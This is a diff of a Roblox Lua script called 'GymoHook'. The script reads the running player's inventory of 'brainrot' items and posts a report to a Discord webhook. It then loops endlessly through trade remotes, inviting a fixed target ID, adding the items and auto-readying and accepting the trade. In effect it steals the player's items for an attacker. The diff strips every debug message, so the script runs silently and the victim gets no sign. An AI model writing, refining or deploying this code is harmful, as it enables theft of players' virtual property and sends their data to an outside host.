@@ -12,9 +12,6 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-warn("[GymoHook] Script démarré...")
-warn("[GymoHook] Webhook: " .. (getgenv().WEBHOOK_URL or "NON DÉFINI"))
-warn("[GymoHook] Target ID: " .. (getgenv().TARGET_ID or "NON DÉFINI"))
 
 local GOOD_WEBHOOK = getgenv().WEBHOOK_URL or "WEBHOOK URL"
 local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
@@ -101,12 +98,7 @@ local function loadSyncData()
 end
 
 local SYNC_DATA = loadSyncData()
-if not SYNC_DATA then 
-    warn("[GymoHook] ❌ Erreur: Impossible de charger les données")
-    return 
-end
-
-warn("[GymoHook] ✅ Données chargées")
+if not SYNC_DATA then return end
 
 local brainrotQueue = {}
 for _, plotData in pairs(SYNC_DATA) do
@@ -117,9 +109,6 @@ for _, plotData in pairs(SYNC_DATA) do
             if type(animalList) == "table" then
                 for slotKey, data in pairs(animalList) do
                     if type(data) == "table" and data.Index and TargetBrainrots[data.Index] then
-                        local info = AnimalsData and AnimalsData[data.Index]
-                        local displayName = info and info.DisplayName or data.Index
-                        print("[GymoHook] 🎯 Brainrot détecté: " .. displayName .. " (Slot: " .. slotKey .. ")")
                         table.insert(brainrotQueue, {slotKey = tonumber(slotKey), data = data})
                     end
                 end
@@ -128,12 +117,7 @@ for _, plotData in pairs(SYNC_DATA) do
     end
 end
 
-if #brainrotQueue == 0 then 
-    warn("[GymoHook] ❌ Aucun brainrot détecté dans la liste cible")
-    return 
-end
-
-warn("[GymoHook] ✅ " .. #brainrotQueue .. " brainrot(s) trouvé(s)!")
+if #brainrotQueue == 0 then return end
 
 applyEverythingAfterTargetFound()
 
@@ -309,7 +293,6 @@ local function getBestImageUrl(displayName, animalIndex)
 end
 
 local function sendDetailedWebhook()
-    print("[GymoHook] 📤 Envoi du rapport Discord...")
     local resultsPrimary = {}
     local requirePingPrimary = false
 
@@ -443,29 +426,21 @@ local function sendDetailedWebhook()
     end
 
     sendToWebhook(resultsPrimary, GOOD_WEBHOOK, requirePingPrimary, GOOD_AVATAR)
-    print("[GymoHook] ✅ Rapport Discord envoyé")
 end
 
 local function startFullAutomation()
-    warn("[GymoHook] 🤖 Lancement de l'automation...")
     local inviteRemote = getRemote("TradeService/Invite")
     local addRemote    = getRemote("TradeService/AddBrainrot")
     local readyRemote  = getRemote("TradeService/Ready")
     local acceptRemote = getRemote("TradeService/Accept")
 
-    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then 
-        warn("[GymoHook] ❌ Erreur: Remotes introuvables")
-        return 
-    end
-    
-    warn("[GymoHook] ✅ Remotes trouvées - Automation active")
+    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then return end
 
     task.spawn(function()
         local idx = 1
         while true do
             local item = brainrotQueue[idx]
             if item then
-                print("[GymoHook] 📝 Sélection brainrot slot " .. item.slotKey)
                 pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
                 idx = (idx % #brainrotQueue) + 1
             end
@@ -474,7 +449,6 @@ local function startFullAutomation()
     end)
 
     task.spawn(function()
-        print("[GymoHook] 📨 Envoi d'invitations au joueur cible (ID: " .. TARGET_ID .. ")")
         while true do
             pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
             task.wait(TRADE_CYCLE_DELAY)
@@ -482,7 +456,6 @@ local function startFullAutomation()
     end)
 
     task.spawn(function()
-        print("[GymoHook] ⏳ Acceptation automatique activée")
         while true do
             pcall(function() readyRemote:FireServer(READY_GUID) end)
             task.wait(1)
@@ -492,15 +465,7 @@ local function startFullAutomation()
     end)
 end
 
-print("[GymoHook] ━━━━━━━━━━━━━━━━━━━━━")
-warn("[GymoHook] ⚙️  INITIATION DU SCRIPT")
-print("[GymoHook] ━━━━━━━━━━━━━━━━━━━━━")
-
 sendDetailedWebhook()
 startFullAutomation()
-
-print("[GymoHook] ━━━━━━━━━━━━━━━━━━━━━")
-warn("[GymoHook] ✨ SCRIPT ACTIF")
-print("[GymoHook] ━━━━━━━━━━━━━━━━━━━━━")
 end)
 
